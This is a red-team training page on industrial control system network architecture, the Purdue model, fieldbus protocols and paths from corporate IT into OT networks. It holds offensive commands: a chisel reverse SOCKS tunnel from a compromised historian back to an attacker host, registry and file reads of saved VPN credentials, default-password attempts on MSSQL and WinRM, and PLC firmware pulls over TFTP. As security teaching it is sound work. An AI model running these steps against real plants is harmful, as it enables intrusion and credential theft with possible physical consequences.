---
layout: training-page
title: "ICS Architecture & Network Segmentation — Red Team Academy"
module: "OT/ICS Security"
tags:
  - ics-architecture
  - purdue-model
  - network-segmentation
  - fieldbus
  - ot-network
page_key: "ot-ics-ics-architecture"
render_with_liquid: false
---

# ICS Architecture & Network Segmentation

Understanding ICS network architecture is a prerequisite for effective red teaming. The Purdue Reference Model provides the canonical framework for thinking about these environments, and understanding where each level sits helps identify attack paths and pivot opportunities.

---

## The Purdue Reference Model (ISA-95 / ISA-99)

The Purdue Enterprise Reference Architecture (PERA) was developed in the 1990s as a hierarchical model for industrial automation. It defines five levels of function, each with distinct devices, protocols, and security requirements.

```
Level 4: Enterprise/Business Network
    ├── ERP systems (SAP, Oracle)
    ├── Corporate email, file servers
    └── Business intelligence systems
         ↕  [Firewall/DMZ — often poorly enforced]
Level 3.5: DMZ (ICS Demilitarized Zone)
    ├── Historian servers (OSIsoft PI, GE Proficy)
    ├── File transfer servers
    └── Remote access jump hosts
         ↕  [Firewall — frequently bypassed]
Level 3: Site Operations / Manufacturing Operations
    ├── SCADA servers
    ├── Engineering workstations
    ├── HMI servers
    ├── Patch management servers
    └── AV/security management
         ↕  [Firewall or VLAN separation — often weak]
Level 2: Area Supervisory Control
    ├── DCS controllers
    ├── Local HMI stations
    └── Data historians (local)
         ↕  [Often minimal or no segmentation]
Level 1: Basic Control
    ├── PLCs (Siemens S7, Allen-Bradley, Schneider)
    ├── RTUs
    └── Intelligent Electronic Devices (IEDs)
         ↕  [Fieldbus — no authentication, no encryption]
Level 0: Process
    ├── Sensors (temperature, pressure, flow)
    ├── Actuators (valves, motors, pumps)
    └── Physical process equipment
```

---

## Level-by-Level Attack Surface Analysis

### Level 4: Enterprise Network

**Devices**: Domain controllers, email servers, endpoints, web proxies.

**Attack Surface**:
- Standard IT attack techniques apply fully here
- Phishing, credential stuffing, VPN exploitation
- The goal at this level: establish initial access and pivot toward Level 3

**Key Finding**: Many Level 4 → Level 3 connections use Windows file shares, RDP, or web applications without proper segmentation.

```bash
# From Level 4, look for paths to Level 3
# Find dual-homed hosts (historian servers, jump boxes)
nmap -sn 192.168.1.0/24 192.168.10.0/24 --open

# Enumerate SMB shares that might reach OT network
crackmapexec smb 192.168.1.0/24 --shares

# Search for "SCADA", "PLC", "historian" in Active Directory
ldapsearch -x -H ldap://dc.corp.local -D "user@corp.local" -w password \
  -b "DC=corp,DC=local" "(description=*SCADA*)"
```

### Level 3.5: DMZ

**Devices**: Historian servers, secure file transfer, remote access jump hosts, patching servers.

**This is the crown jewel for lateral movement.** The DMZ is designed to bridge IT and OT while maintaining isolation — in practice, it's the most common pivot point.

**Attack Surface**:
- Historian servers often have Modbus/OPC-UA connections to Level 1-2 devices
- Jump hosts typically have RDP access to engineering workstations
- File transfer servers may accept uploads that reach OT systems

```bash
# Identify historian servers in the environment
# Look for: PI Server, Wonderware Historian, GE Proficy, AspenTech IP.21
nmap -sV -p 5450,5452,5461,60397,60398 <dmz_range>
# Port 5450/5452: OSIsoft PI Server
# Port 5461: Wonderware Historian

# Check for web-accessible historian APIs
curl -sk https://<historian_ip>/piwebapi/
curl -sk https://<historian_ip>/piwebapi/system

# Identify OPC-UA servers (common bridge protocol)
nmap -sV -p 4840 <dmz_range>
```

### Level 3: Site Operations

**Devices**: SCADA servers, engineering workstations, HMI servers, domain controllers for OT domain.

**Attack Surface**:
- SCADA software vulnerabilities (see SCADA/HMI module)
- Engineering workstations running outdated Windows versions
- Credentials stored in SCADA project files
- OT domain often separate from IT domain — needs separate credentials

```bash
# Engineering workstations frequently run older Windows
# Check for EternalBlue on OT network (common finding)
nmap --script smb-vuln-ms17-010 -p 445 <level3_range>

# Check for WannaCry vulnerability
nmap --script smb-vuln-ms17-010 --script-args smb-vuln-ms17-010.timeout=15s \
  -p 445 <level3_range>

# Look for unpatched systems
nmap -sV --script=smb-security-mode <level3_range>

# SCADA software detection
nmap -sV -p 80,443,8080,9443 --script=http-title <level3_range>
```

### Level 2: Supervisory Control

**Devices**: DCS (Distributed Control Systems), local HMIs, OPC servers.

**Attack Surface**:
- DCS workstations often run Windows CE or embedded Windows
- OPC (DA/HDA/UA) servers bridge Level 2 and Level 1
- Minimal authentication between levels

```bash
# OPC-DA/HDA uses DCOM — look for Windows registry-based OPC servers
# OPC-UA uses TCP 4840/4843
nmap -sV -p 4840,4843,135,102 <level2_range>

# DCOM enumeration for OPC-DA
rpcclient -U "" <target> -N -c "enuminterfaces"
```

### Level 1: Basic Control (PLCs/RTUs)

**Devices**: PLCs, RTUs, IEDs, smart instruments.

**Attack Surface**:
- Protocols have zero or weak authentication (Modbus, DNP3)
- Many PLCs have undocumented backdoor commands
- Web interfaces on modern PLCs use default credentials
- TFTP servers on PLCs expose firmware and configuration

```bash
# TFTP - many PLCs expose configuration/firmware via TFTP
# Attempt to download PLC configuration
tftp <plc_ip>
get config.bin
get firmware.hex

# Siemens S7-specific
# S7comm runs on TCP 102 via ISO-TSAP
nmap -sV -p 102 --script=s7-info <plc_ip>

# Check for web interface on PLCs
nmap -sV -p 80,443,8080 <level1_range>
# Many PLCs: admin/admin, admin/(blank), user/(blank)
```

---

## Fieldbus Protocols Reference

### Modbus (1979)

The oldest and most common ICS protocol. No authentication, no encryption.

- **Modbus RTU**: Serial (RS-485/RS-232), binary encoded
- **Modbus TCP**: Ethernet encapsulation, port 502
- **Modbus ASCII**: Serial, ASCII encoded, less common

```
Function codes of interest:
FC01: Read Coils (discrete outputs)
FC02: Read Discrete Inputs
FC03: Read Holding Registers
FC04: Read Input Registers  
FC05: Write Single Coil    ← attack target
FC06: Write Single Register ← attack target
FC15: Write Multiple Coils  ← attack target
FC16: Write Multiple Registers ← attack target
FC43: Read Device Identification (no auth, reveals device info)
```

### DNP3 (1990s)

Used extensively in electric utilities, water treatment, and oil/gas. SCADA master/outstation architecture.

- **Transport**: Serial or TCP (port 20000)
- **Authentication**: Optional (Secure Authentication v5 — rarely deployed)
- **Key concern**: Control messages can be injected with no authentication on older installations

### PROFIBUS (1989)

- Process Field Bus — dominant in European manufacturing
- **PROFIBUS DP**: RS-485, fast, for PLCs and I/O
- **PROFIBUS PA**: Process automation, intrinsically safe
- Primarily found at Levels 0-1, harder to attack remotely

### PROFINET

- Ethernet-based successor to PROFIBUS
- Runs over standard TCP/UDP — more network-accessible
- Port 34964 (UDP), uses DCP (Discovery and Configuration Protocol) for device enumeration
- **Attack**: DCP enumeration reveals all PROFINET devices without authentication

```bash
# Nmap for PROFINET devices
nmap -sU -p 34964 --script=pn-discovery <subnet>
```

### EtherNet/IP (Allen-Bradley/Rockwell)

- Common Industrial Protocol (CIP) over Ethernet/IP
- Port 44818 (TCP), Port 2222 (UDP)
- Used heavily in North American manufacturing

```bash
# Enumerate EtherNet/IP devices
nmap -p 44818 --script=enip-info <subnet>
# Returns: vendor, product name, serial number, firmware version
```

### IEC 61850 (Power Utility Automation)

- Used in substations, power generation
- MMS (Manufacturing Message Specification) on TCP 102
- GOOSE (Generic Object-Oriented Substation Event) — UDP multicast for fast protection relay messaging
- **Attack surface**: GOOSE messages have no authentication — can be spoofed on network access

---

## Network Zones and Common Bypass Paths

### Ideal Architecture (Rarely Implemented)

```
Internet
    │
   [Perimeter Firewall]
    │
Corporate Network (Level 4)
    │
   [Firewall — deny all except specific ports/IPs]
    │
ICS DMZ (Level 3.5) — one-way data diode or strict unidirectional rules
    │
   [Firewall — deny IT→OT except historian queries]
    │
OT Network (Levels 0-3)
```

### Real Architecture (Commonly Encountered)

```
Internet
    │
   [Perimeter Firewall]
    │
Corporate Network
    │    │    │
    │  Historian (dual-homed: IT + OT NICs)
    │    │    │
   [Firewall — "allow established" rules, often overly permissive]
    │
OT Network
    ├── PLC_1 (Modbus TCP :502)
    ├── PLC_2 (S7comm :102)
    ├── HMI Workstation (Windows 7, no AV)
    └── Engineering WS (Windows XP SP3)
```

### Bypass Technique #1: Historian Pivot

```bash
# After compromising historian server:
# 1. Enumerate network interfaces
Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias

# 2. Scan OT network from historian
# (historian has both IT and OT network access)
Invoke-Portscan -Hosts 10.0.1.0/24 -Ports "102,502,20000,44818" -Open

# 3. Use historian as proxy via Chisel
# On attacker machine:
chisel server --port 8888 --reverse
# On historian:
chisel.exe client <attacker_ip>:8888 R:socks

# 4. Now tunnel OT protocol tools through historian
proxychains nmap -T2 -p 502 10.0.1.0/24
```

### Bypass Technique #2: Vendor VPN Abuse

Maintenance vendors (Siemens, Rockwell, Schneider) often have standing VPN access.

```bash
# Search for vendor VPN configuration files
# Look in: %APPDATA%\Cisco\VPN Client, C:\Program Files\*VPN*
# Common: FortiClient, Cisco AnyConnect, PulseSecure configs

# Extract saved VPN credentials from FortiClient
reg query "HKCU\Software\Fortinet\FortiClient\Sslvpn\Tunnels" /s

# Cisco AnyConnect profiles
type "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\*.xml"

# GlobalProtect
type "C:\Users\*\AppData\Roaming\Palo Alto Networks\GlobalProtect\*.xml"
```

### Bypass Technique #3: Air-Gap Crossing via USB

When networks are truly segmented, USB-based attacks remain viable.

- **Stuxnet**: Exploited 4 zero-days, spread via USB to reach air-gapped Siemens S7-315 PLCs
- **Agent.BTZ**: Used autorun.inf, affected US military networks
- **USB Drop Campaign**: Physical placement in parking lots/facilities

---

## Air-Gap Myths

The term "air-gapped" is often applied incorrectly. True air gaps are rare:

### How "Air-Gapped" Networks Get Compromised

1. **Authorized USB use**: Technicians use USB drives to transfer PLC programs and HMI updates. These cross the gap.
2. **Vendor laptops**: Maintenance vendors connect laptops to PLC programming ports. Same laptop connects to internet at hotel.
3. **Laptop cross-contamination**: Engineer's laptop connects to both OT and hotel WiFi (not simultaneously, but sequentially). Malware persists.
4. **Compact flash cards**: PLCs store programs on CF cards. These are swapped during maintenance.
5. **Serial-to-Ethernet converters**: "Air-gapped" device connected via serial to an Ethernet converter for "monitoring only."
6. **Serial-to-WiFi bridges**: Discovered in power plants — added by technicians for convenience.

---

## Common Network Discovery Techniques

### Passive Discovery (Always Start Here)

```bash
# Zeek (Bro) for ICS protocol detection
# Install Zeek ICS package
zkg install corelight/zeek-spicy-ics
zeek -i eth0

# NetworkMiner — passive asset discovery from pcap
# Identifies OS, services, and communication patterns

# p0f for passive OS fingerprinting
p0f -i eth0 -p -o /tmp/p0f.log

# Passive Modbus analysis
tshark -i eth0 -Y modbus -T fields \
  -e ip.src -e ip.dst -e modbus.func_code -e modbus.reference_num
```

### Active Discovery (With Permission)

```bash
# Nmap with OT NSE scripts — use -T2 (polite timing)
nmap -T2 -sV \
  -p 102,502,20000,44818,2222,4840,47808 \
  --script=s7-info,modbus-discover,enip-info,dnp3-info,bacnet-info \
  <ot_subnet>

# Digital Bond Redpoint NSE scripts
# https://github.com/digitalbond/Redpoint
nmap --script=./redpoint/s7-info.nse -p 102 <target>
nmap --script=./redpoint/modbus-discover.nse -p 502 <target>
nmap --script=./redpoint/enip-enumerate.nse -p 44818 <target>
nmap --script=./redpoint/dnp3-info.nse -p 20000 <target>
nmap --script=./redpoint/fox-info.nse -p 1911 <target>  # Tridium Niagara

# GRASSMARLIN for passive topology mapping
# Produces network diagram showing ICS communication relationships
```

---

## Historian Servers as Pivot Points

Historian servers are the most critical pivot point in ICS architecture. They are explicitly designed to have access to both worlds.

### Common Historian Products

| Product | Vendor | Default Ports | Notes |
|---------|--------|--------------|-------|
| PI System | OSIsoft (AVEVA) | 5450, 5452, 5461, TCP 443 (web API) | Market leader |
| Proficy Historian | GE Digital | 14000, 14001 | Common in manufacturing |
| InduSoft Web Studio | AVEVA | 1234 | |
| Wonderware Historian | AVEVA | 1434 (SQL), 61443 | |
| AVEVA Historian | AVEVA | 5450 | Renamed from OSIsoft PI |

### Attacking the Historian

```bash
# OSIsoft PI System Web API discovery
curl -sk https://<historian>/piwebapi/
# Returns JSON with all configured elements

# Unauthenticated PI data access (older versions)
curl -sk "http://<historian>:5461/piwebapi/streams/<tag_id>/value"

# PI System uses Windows authentication — check for null session
rpcclient -U "" <historian> -N

# SQL Server backend (many historians use MSSQL)
nmap -p 1433 --script=ms-sql-info,ms-sql-config,ms-sql-ntlm-info <historian>

# Try default SA account
mssqlclient.py sa:''@<historian>
mssqlclient.py sa:'sa'@<historian>
```

---

## Engineering Workstations: The Weak Link

Engineering workstations (EWS) are the primary management interface for PLCs and DCS. They typically run:

- **Windows XP SP3** (common in nuclear and water utilities — 2025 reality)
- **Windows 7** (most common overall in OT environments)
- **Siemens STEP 7**, **TIA Portal**, **Rockwell RSLogix/Studio 5000**, **Schneider Unity Pro**
- No antivirus (AV can interfere with control system software timing)
- No Windows Update (patches require validation against control system vendor approval)
- Default or shared credentials (`Administrator/Administrator`, `admin/password`)

```bash
# Enumerate EWS from OT network segment
nmap -T2 -sV -p 135,139,445,3389,5985 <level3_range>

# Check for EternalBlue (MS17-010) — extremely common on Windows 7 EWS
nmap --script smb-vuln-ms17-010 -p 445 <ews_ip>

# Look for WMI / WinRM access (often enabled on EWS for SCADA integration)
crackmapexec winrm <ews_ip> -u Administrator -p 'Password123'

# Check for SCADA software listening ports
netstat -ano | findstr LISTEN
# Typical: RSLinx (44818), KEPServerEX (502, 4840, 49320), FactoryTalk (49152+)
```

---

*Next: [Modbus/TCP Attacks](modbus-attacks.md)*
